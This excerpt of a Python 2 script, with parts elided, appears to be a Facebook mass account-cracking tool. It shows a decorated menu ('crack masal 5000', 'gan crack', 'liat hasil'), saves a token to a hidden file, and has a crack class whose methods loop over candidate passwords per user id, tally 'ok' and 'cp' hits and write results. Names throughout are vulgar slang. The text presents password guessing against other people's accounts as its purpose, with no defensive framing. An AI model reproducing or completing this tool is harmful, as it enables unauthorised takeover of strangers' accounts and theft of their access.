...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s%s ═══════ %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s%s '%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s═══════%s 𝑒𝑛𝑡𝑒𝑟 '%(O,N));wuhan(kontol)
...
def moch_yayan():
    ...
    print '[%s1%s]\033[0;96m═══════\x1b[1;97m 𝔠𝔯𝔞𝔠𝔨 𝔪𝔞𝔰𝔞𝔩\x1b[1;92m 5000'%(O,N);time.sleep(0.08)
    print '[%s2%s]═══════ 𝔤𝔞𝔫 𝔠𝔯𝔞𝔠𝔨'%(O,N);time.sleep(0.08)
    print '[%s3%s]═══════ 𝔩𝔦𝔞𝔱 𝔥𝔞𝔰𝔦𝔩'%(O,N);time.sleep(0.08)
    print '[%s0%s]═══════ 𝔨𝔢𝔩𝔲𝔞𝔯 %s%s'%(M,N,M,N);time.sleep(0.08)
    pepek = raw_input('\n【𝗙】 𝗠𝗘𝗡𝗨 : ')
    if pepek == '':
...
class __crack__:
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] 【═══════】 %s/%s -> 𝔬𝔨-:%s - 𝔠𝔭-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s•%s] 【═══════】 %s/%s -> 𝑜𝑘-:%s - 𝑐𝑝-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
